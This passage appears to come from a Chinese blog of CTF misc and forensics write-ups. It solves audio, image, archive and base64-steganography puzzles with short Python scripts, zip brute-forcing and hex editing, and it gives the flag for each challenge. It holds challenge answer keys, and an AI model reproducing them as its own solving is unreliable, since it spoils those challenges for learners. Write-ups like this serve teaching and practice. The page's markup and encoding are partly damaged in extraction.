constant">L</span> <span class="token constant">M</span> <span class="token constant">N</span> <span class="token constant">O</span> <span class="token constant">P</span> <span class="token constant">Q</span> <span class="token constant">R</span> <span class="token constant">S</span> <span class="token constant">T</span> <span class="token constant">U</span> <span class="token constant">V</span> <span class="token constant">W</span> <span class="token constant">X</span> <span class="token constant">Y</span> <span class="token constant">Z</span> <span class="token keyword">do</span> eval An <span class="token operator">=</span> <span class="token string">"n"</span>done num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> n <span class="token keyword">in</span> a b c d e f g h i j <span class="token keyword">do</span> eval Bn <span class="token operator">=</span> <span class="token string">"n"</span>num <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>done <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Bk=' ';Bm='"</span><span class="token string">';Bn='</span>#<span class="token string">';Bs='</span><span class="token punctuation">(</span><span class="token string">';Bt='</span><span class="token punctuation">)</span><span class="token string">';By='</span><span class="token punctuation">.</span><span class="token string">';Cb='</span><span class="token string">';Cc='</span><span class="token operator">&lt;</span><span class="token string">';Ce='</span><span class="token operator">></span><span class="token string">';Cl='</span>_<span class="token string">';Cn='</span><span class="token punctuation">&#123;</span><span class="token string">';Cp='</span><span class="token punctuation">&#125;</span><span class="token string">';Da='</span><span class="token number">0</span><span class="token string">';Db='</span><span class="token number">1</span><span class="token string">';Dc='</span><span class="token number">2</span><span class="token string">';Dd='</span><span class="token number">3</span><span class="token string">';De='</span><span class="token number">4</span><span class="token string">';Df='</span><span class="token number">5</span><span class="token string">';Dg='</span><span class="token number">6</span><span class="token string">';Dh='</span><span class="token number">7</span><span class="token string">';Di='</span><span class="token number">8</span><span class="token string">';Dj='</span><span class="token number">9</span>'<span class="token punctuation">;</span>"<span class="token punctuation">)</span></code></pre><p>再用下大师傅的脚本跑一下。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> strings <span class="token operator">=</span> <span class="token string">"$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span>ll <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Bk'</span><span class="token punctuation">,</span><span class="token string">'Bm'</span><span class="token punctuation">,</span><span class="token string">'Bn'</span><span class="token punctuation">,</span><span class="token string">'Bs'</span><span class="token punctuation">,</span><span class="token string">'Bt'</span><span class="token punctuation">,</span><span class="token string">'By'</span><span class="token punctuation">,</span><span class="token string">'Cb'</span><span class="token punctuation">,</span><span class="token string">'Cc'</span><span class="token punctuation">,</span><span class="token string">'Ce'</span><span class="token punctuation">,</span><span class="token string">'Cl'</span><span class="token punctuation">,</span><span class="token string">'Cn'</span><span class="token punctuation">,</span><span class="token string">'Cp'</span><span class="token punctuation">,</span><span class="token string">'Da'</span><span class="token punctuation">,</span><span class="token string">'Db'</span><span class="token punctuation">,</span><span class="token string">'Dc'</span><span class="token punctuation">,</span><span class="token string">'Dd'</span><span class="token punctuation">,</span><span class="token string">'De'</span><span class="token punctuation">,</span><span class="token string">'Df'</span><span class="token punctuation">,</span><span class="token string">'Dg'</span><span class="token punctuation">,</span><span class="token string">'Dh'</span><span class="token punctuation">,</span><span class="token string">'Di'</span><span class="token punctuation">,</span><span class="token string">'Dj'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>s <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>list3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'A%s'</span><span class="token operator">%</span>i<span class="token punctuation">)</span>list4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#print(list3,'\n',list4)</span>t <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>t <span class="token operator">+=</span> list2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list3<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">:</span>t <span class="token operator">+=</span>list4<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200602234455619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h2><p>下载得到音频文件和一张图片，听音频，听到最后面发现异常，也不知道是什么，也不是摩斯密码什么的，后来看hint是电话音，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NDQyODA1OS0xMzUzNDQyNTM3LnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"></p><p>看了大佬的wp(这个比赛的时候我是没有做出来的，没有思路)<br>需要用到一个工具，<code>dtmf2num.exe</code><br>下载地址呢，emmm这个大佬他给了下载链接，可以去他博客里找链接，毕竟不好直接搬过来。——<a href="http://blog.ysneko.com/archives/166/">传送门</a><br>然后下载好啦之后，需要先将那个音频进行剪辑，把后面那段电话音剪出来，<br>可以选中电话音前面的所有部分，然后剪切掉</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NTYwMDAyOC0yMDQ2MTY3OTE3LnBuZw?x-oss-process=image/format,png" loading="lazy"></p><p>再导出文件就行了。<br>然后使用dtmf解题<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NTg0NTU3Ni01ODc1MTA4MTMucG5n?x-oss-process=image/format,png" loading="lazy"></p><p><code>#22283334447777338866#</code><br>九键</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MDAyMjk0NS00MDM5NzUzOTAucG5n?x-oss-process=image/format,png" loading="lazy"><br>是<code>ctfisfun</code><br>然后第二个hint是</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MDExMzY5NC0xMjg2NDIyOTY2LnBuZw?x-oss-process=image/format,png" loading="lazy"><br>工具吧，百度搜索就行。<br>然后打开使用，可能需要将原来的JPEG为后缀的图片改成jpg格式，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MTMzMzE2NC04OTA2NjQyMjQucG5n?x-oss-process=image/format,png" loading="lazy"></p><p>输入密码，<code>ctfisfun</code><br>得到一个flag.txt</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MTQxODM0NS02OTkxMDcyNzMucG5n?x-oss-process=image/format,png" loading="lazy"></p><h2 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h2><p>foremost分离图片得到压缩包，然后是弱口令，8864（都是傻瓜式操作就不截图了）<br>解压出来flag.txt是<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwOTE4NTUwNDU5OC0xMDIxNzYwNzM5LnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"><br>进行词频分析（这个应该就是考点）<br>官方给的脚本，这个在线网址有点力不从心。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># gakki_exp.py</span><span class="token comment"># Author : imagin</span>alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>d<span class="token punctuation">:</span><span class="token number">0</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> alphabet<span class="token punctuation">&#125;</span> <span class="token keyword">def</span> <span class="token function">sort_by_value</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>    backitems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> v <span class="token keyword">in</span> items<span class="token punctuation">]</span>    backitems<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span> backitems<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>backitems<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">for</span> alpha <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> alpha<span class="token punctuation">:</span>            result<span class="token punctuation">[</span>alpha<span class="token punctuation">]</span> <span class="token operator">=</span> result<span class="token punctuation">[</span>alpha<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>sort_by_value<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>跑一遍得结果<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwOTE4NTY0OTY3NS0xMjQzMjAyMjYyLnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"><br>flag{gaki_IsMyw1fe}</p><h2 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h2><p>解压得到密码文件，misc文件夹是空的，编码没见过，所以就百度了一下，然后发现这种编码可以使用010editor转换<br><img src="https://img-blog.csdnimg.cn/20200609193115550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>转换就得到密码，再次解压得到图片<br><img src="https://img-blog.csdnimg.cn/20200609193202349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>是跳舞的小人，百度寻找对照表<br>得到flag{iloveholmesandwllm}</p><h2 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h2><p>这个流量分析，追踪流没得到有用的信息，尝试导出http，然后看到了六张png图片。<br>使用stegsolve查看，在logo.png 中得到flag<br><img src="https://img-blog.csdnimg.cn/20200609202101219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>flag{J0hn_th3_Sn1ff3r}<br>也有直接进行foremost分离得到图片的，两种方法均可。</p><h2 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h2><p>先解密这个题目，是base64，得到<code>Is this base?</code><br>然后打开压缩包后得到的flag.txt看到<br><img src="https://img-blog.csdnimg.cn/20200624232036477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>虽然很多，但是还是进行了解码查看了一下，但是没找到有用的信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">Cette nuit,Intenable insomnie,La folie me guette,Je suis ce que je fuisJe subis,Cette cacophonie,Qui me scie la t锚te,Assommante harmonie,Elle me dit,Tu paieras tes delits,Quoi qu<span class="token string">'il advienne,On tra卯ne ses cha卯nes,Ses peines,Je voue mes nuits,A l'</span>assasymphonie,Aux requiems,Tuant par depit,Ce que je seme,Je voue mes nuits,A l<span class="token string">'assasymphonie,Et aux blasphemes,J'</span>avoue je maudis,Tous ceux qui s<span class="token string">'aiment,L'</span>ennemi,Tapi dans mon esprit,F锚te mes defaites,Sans repit me defie,Je renie,La fatale heresie,Qui ronge mon 锚tre,Je veux rena卯tre,Rena卯tre,Je voue mes nuits,A l<span class="token string">'assasymphonie,Aux requiems,Tuant par depit,Ce que je seme,Je voue mes nuits,A l'</span>assasymphonie,Et aux blasphemes,J<span class="token string">'avoue je maudis,Tous ceux qui s'</span>aiment,Pleurent les violons de ma vie,La violence de mes envies,Siphonnee symphonie,Deconcertant concerto,Je joue sans toucher le Do,Mon talent sonne faux,Je noie mon ennui,Dans la melomanie,Je tue mes phobies,Dans la desharmonie,Je voue mes nuits,A l<span class="token string">'assasymphonie,Aux requiems,Tuant par depit,Ce que je seme,Je voue mes nuits,A l'</span>assasymphonie,Et aux blasphemes,J<span class="token string">'avoue je maudis,Tous ceux qui s'</span>aiment,Je voue mes nuits,A l<span class="token string">'assasymphonie (l'</span>assasymphonie<span class="token punctuation">)</span>,J<span class="token string">'avoue je maudis,Tous ceux qui s'</span>aiment</code></pre><p>还有乱码，又想到这个题是杂项里面的，应该不是只让解密的吧，反正还是没有其他的思路。<br>这个emmm没有什么思路了，就找wp学习学习<br>发现是base64隐写<br>学习看这里🔑<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html">神奇的base64</a><br>然后跑下脚本就出来了吧。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: cp936 -*-</span>b64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    bin_str <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        stegb64 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        rowb64 <span class="token operator">=</span>  <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>stegb64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        offset <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>stegb64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>b64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>rowb64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        equalnum <span class="token operator">=</span> stegb64<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span> <span class="token comment">#no equalnum no offset</span>        <span class="token keyword">if</span> equalnum<span class="token punctuation">:</span>            bin_str <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>equalnum <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#8 位一组</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020062423371269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>注意是python2写的脚本，需要使用2.7的版本去运行。<br>flag{fazhazhenhaoting}<br>这道题与    （[ACTF新生赛2020]base64隐写）相似，可以一块了解。<br><img src="https://img-blog.csdnimg.cn/20200625204213651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h2><p>两个压缩包都有密码，每个查过一遍，看到flag3.zip上有备注，是一个六位数字的密码。暴力破解就行。<br>然后解码得到一个word文档和影流之主的mp4文件<br><img src="https://img-blog.csdnimg.cn/20200625001336854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后两个不寻常的数字，分别查看视频中相应的帧数所在的画面<br><img src="https://img-blog.csdnimg.cn/20200624234739736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200624234816309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>在灯上，两条信息得到</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token punctuation">..</span>/<span class="token punctuation">..</span>. ./<span class="token punctuation">..</span>. ./<span class="token punctuation">..</span>. <span class="token punctuation">..</span>/<span class="token assign-left variable">dXBfdXBfdXA</span><span class="token operator">=</span></code></pre><p>第一个是敲击码<br><img src="https://img-blog.csdnimg.cn/20200625000702741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>解码得到WLLM，与base64解出的拼接到一起是wllmup_up_up，也就是flag2.zip的密码<br>得到图片用010editor打开<br><img src="https://img-blog.csdnimg.cn/20200625001018203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h2><p>不用爆破，tar zxvf不管用，那么密码就可能没有或者伪加密，或者在备注当中再有就是文件名就是密码。的确是文件名，但是解压好多次都没有得到结果。<br>看了wp，发现要解压300次，应该是不行的。<br>还有就是脚本，这里直接使用脚本可以。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#来源官方wp#</span><span class="token keyword">import</span> zipfilename <span class="token operator">=</span> <span class="token string">'hW1ES89jF'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    fz <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'.tar.gz'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    fz<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> fz<span class="token punctuation">.</span>filelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    fz<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意，运行自行建立一个新文件夹，然后就是傻瓜式操作。<br>找到flag文件用记事本打开就可以了。</p><h2 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h2><p>打开后是一个文本文件，emmm脑洞太小，想不到。看wp学习<br>emmm💡是十六进制，用HxD编辑保存一下<br><img src="https://img-blog.csdnimg.cn/20200625184322235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>是压缩包，而且压缩包有密码，emmm，也不是伪加密。那就暴力破解试试。<br><img src="https://img-blog.csdnimg.cn/20200625185511229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后打开是个图片，但是图片无法打开。<br>010editor查看，发现图片类型是JFIF,应该是jpg图片格式，所以将文件头修改成jpg格式的。<br><img src="https://img-blog.csdnimg.cn/20200625203116578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后看到图片<br><img src="https://img-blog.csdnimg.cn/20200625203149761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">flag<span class="token punctuation">&#123;</span>57cd4cfd4e07505b98048ca106132125<span class="token punctuation">&#125;</span></code></pre><h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包损坏，010editor看到前两组数据换了位置，改回来就行<br><img 